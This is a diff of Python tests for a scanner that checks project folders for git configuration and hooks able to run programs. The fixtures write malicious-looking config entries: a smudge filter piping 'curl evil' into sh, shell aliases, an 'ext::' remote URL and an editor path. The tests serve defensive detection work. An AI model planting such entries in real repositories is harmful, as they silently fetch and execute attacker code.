@@ -68,13 +68,30 @@ def test_a_nested_git_folder_is_reported_not_skipped(tmp_path):
     assert (".git", "low") in whats and ("sub/.git/hook.sh", "medium") in whats
 
 
-def test_git_config_and_active_hooks_are_scanned_because_they_can_run_programs(tmp_path):
+def test_git_config_is_judged_by_an_allowlist_and_active_hooks_are_flagged(tmp_path):
     g = tmp_path / ".git"
     (g / "hooks").mkdir(parents=True)
-    (g / "config").write_text("[core]\n\trepositoryformatversion = 0\n\tfsmonitor = /tmp/run-me\n[filter \"x\"]\n\tsmudge = curl evil | sh\n")
+    (g / "config").write_text("[core]\n\trepositoryformatversion = 0\n\teditor = /tmp/run-me\n[filter \"x\"]\n\tsmudge = curl evil | sh\n[alias]\n\tco = !sh -c evil\n[include]\n\tpath = /tmp/more\n"
+                              "[remote \"origin\"]\n\turl = ext::sh -c evil\n")
     (g / "hooks" / "pre-commit.sample").write_text("#!/bin/sh\n")
     (g / "hooks" / "post-checkout").write_text("#!/bin/sh\necho hi\n")
     r = vetskill.scan(tmp_path)
-    files = {(f["file"], f["severity"]) for f in r["findings"]}
-    assert (".git/config", "high") in files and (".git/hooks/post-checkout", "high") in files and (".git/hooks/pre-commit.sample", "high") not in files
-    assert r["counts"]["high"] >= 3
+    what = " | ".join(f["what"] for f in r["findings"] if f["severity"] == "high")
+    for needle in ("core.editor", "[filter]", "[alias]", "[include]", "remote address that runs a program", "an active git hook"):
+        assert needle in what, needle
+    assert not any("pre-commit.sample" in f["file"] and f["severity"] == "high" for f in r["findings"])
+
+
+def test_a_plain_git_config_is_not_an_alarm_and_a_gitdir_pointer_is(tmp_path):
+    plain = tmp_path / "plain"
+    (plain / ".git").mkdir(parents=True)
+    (plain / ".git" / "config").write_text("[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n[remote \"origin\"]\n\turl = https://github.com/x/y.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"main\"]\n\tremote = origin\n\tmerge = refs/heads/main\n")
+    assert vetskill.scan(plain)["counts"]["high"] == 0
+    elsewhere = tmp_path / "elsewhere"
+    (elsewhere / "hooks").mkdir(parents=True)
+    (elsewhere / "hooks" / "pre-push").write_text("#!/bin/sh\n")
+    ptr = tmp_path / "ptr"
+    ptr.mkdir()
+    (ptr / ".git").write_text(f"gitdir: {elsewhere}\n")
+    whats = [f["what"] for f in vetskill.scan(ptr)["findings"] if f["severity"] == "high"]
+    assert any("pointer" in w for w in whats) and any("active git hook" in w for w in whats)  # the pointed-to folder is scanned too
